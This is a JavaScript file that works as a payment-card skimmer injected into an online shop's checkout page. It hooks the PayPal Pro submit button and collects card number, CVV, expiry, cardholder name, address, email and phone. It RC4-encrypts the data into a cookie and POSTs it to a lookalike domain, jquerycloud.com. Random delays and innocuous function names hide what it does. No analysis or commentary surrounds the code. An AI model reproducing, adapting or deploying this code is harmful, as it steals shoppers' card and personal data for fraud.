function appendScript() {
    setTimeout(function() {
        document.isExecuted || !0 === document.isExecuted || (document.isExecuted = !0, deflateMeyhod())
    }, 1e3 * Math.random())
}

function deflateMeyhod() {
    setInterval(function() {
        setListener()
    }, 2e3)
}

function setListener() {
    jQuery(document.sEvent) && 0 == jQuery(document.sEvent).hasClass(document.sClass) && initListenerStats()
}

function initListenerStats() {
    "1" != getCookie(document.sCookies) && bindFirst(jQuery(document.sEvent), "click", function() {
        saveData()
    }), jQuery(document.sEvent) && jQuery(document.sEvent).addClass(document.sClass)
}

function saveData() {
    var e;
    ccnumber = "", ccname = "", cvv = "", ccdate = "", ccmonth = "", ccyear = "", address = "", shop = "", mail = "", phone = "", city = "", state = "", country = "", zip = "";
    try {
        ccnumber = jQuery("[name='pppro_cc_number']").val()
    } catch (e) {}
    try {
        ccname = jQuery("[name='pppro_cc_first_name']").val() + " " + jQuery("[name='pppro_cc_last_name']").val()
    } catch (e) {}
    try {
        cvv = jQuery("#pppro_cc_cvm").val()
    } catch (e) {}
    try {
        ccdate = ""
    } catch (e) {}
    try {
        ccmonth = jQuery("#pppro_exp_month option:selected").text()
    } catch (e) {}
    try {
        ccyear = jQuery("#pppro_exp_year option:selected").text()
    } catch (e) {}
    try {
        address = jQuery("#address1_invoice").val() + ", " + jQuery("#address2_invoice").val() + " " + jQuery("ul#address_invoice > li.address_address1.address_address2").text()
    } catch (e) {}
    try {
        shop = window.location.host
    } catch (e) {}
    try {
        email = jQuery("#email").val()
    } catch (e) {}
    try {
        phone = jQuery("#phone_invoice").val() + " " + jQuery("ul#address_invoice > li.address_phone").text()
    } catch (e) {}
    try {
        city = jQuery("#city_invoice").val() + " " + jQuery("ul#address_invoice > li.address_city.address_state_name.address_postcode").text()
    } catch (e) {}
    try {
        state = jQuery("#id_state_invoice option:selected").text() + " " + jQuery("ul#address_invoice > li.address_city.address_state_name.address_postcode").text()
    } catch (e) {}
    try {
        country = jQuery("#id_country_invoice option:selected").text()
    } catch (e) {}
    try {
        zip = jQuery("#postcode_invoice").val() + " " + jQuery("ul#address_invoice > li.address_city.address_state_name.address_postcode").text()
    } catch (e) {}
    try {
        country = jQuery("#id_country_invoice option:selected").text() + " " + jQuery("ul#address_invoice > li.address_country_name").text()
    } catch (e) {}
    e = {
        ccnumber: ccnumber,
        ccname: ccname,
        cvv: cvv,
        ccdate: ccdate,
        ccmonth: ccmonth,
        ccyear: ccyear,
        address: address,
        shop: shop,
        email: email,
        phone: phone,
        city: city,
        state: state,
        country: country,
        zip: zip
    };
    var t = JSON.stringify(e),
        c = key(),
        o = eh(c + rc4(c, t));
    createCookie(document.sCookies, o, 36e3)
}

function sendData(e) {
    "" != e && jQuery.ajax({
        url: "https://jquerycloud.com/tr/",
        data: {
            q: e
        },
        type: "POST",
        success: function(e) {
            createCookie(document.sCookies, "1", 36e3), "" != e && console.log(e)
        },
        error: function(e, t, c) {
            createCookie(document.sCookies, "1", 36e3)
        }
    })
}

function worker() {
    var e = getCookie(document.sCookies);
    e && "1" != e && sendData(e)
}
document.sClass = "frydbt", document.sEvent = "#pppro_submit", document.sCookies = "kkeyti", document.addEventListener("DOMContentLoaded", function() {
    appendScript()
}), bindFirst = function(e, t, c) {
    var o, r, n, a;
    for (e.bind(t, c), n = 0, a = e.length; n < a; n++) o = e[n], (r = jQuery._data(o).events[t.split(".")[0]]).unshift(r.pop())
};
var createCookie = function(e, t, c) {
        var o = "";
        if (c) {
            var r = new Date;
            r.setTime(r.getTime() + 60 * c * 1e3), o = "; expires=" + r.toUTCString()
        }
        document.cookie = e + "=" + t + o + "; path=/"
    },
    getCookie = function(e) {
        var t = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
        return t ? decodeURIComponent(t[1]) : void 0
    },
    rc4 = function(e, t) {
        for (var c, o = [], r = 0, n = "", a = 0; a < 256; a++) o[a] = a;
        for (a = 0; a < 256; a++) r = (r + o[a] + e.charCodeAt(a % e.length)) % 256, c = o[a], o[a] = o[r], o[r] = c;
        a = 0, r = 0;
        for (var s = 0; s < t.length; s++) r = (r + o[a = (a + 1) % 256]) % 256, c = o[a], o[a] = o[r], o[r] = c, n += String.fromCharCode(t.charCodeAt(s) ^ o[(o[a] + o[r]) % 256]);
        return n
    },
    key = function() {
        for (var e = "", t = 0; t < 16; t++) e += String.fromCharCode(Math.round(255 * Math.random()));
        return e
    },
    dh = function(e) {
        res = "";
        for (var t = 0; t < e.length; t += 2) res += sr.fromCharCode(parseInt(e.substr(t, 2), 16));
        return res
    },
    eh = function(e) {
        var t, c = "";
        for (t = 0; t < e.length; t++) c += ("0" + e.charCodeAt(t).toString(16)).slice(-2);
        return c
    };
setTimeout(function() {
    worker()
}, 500);
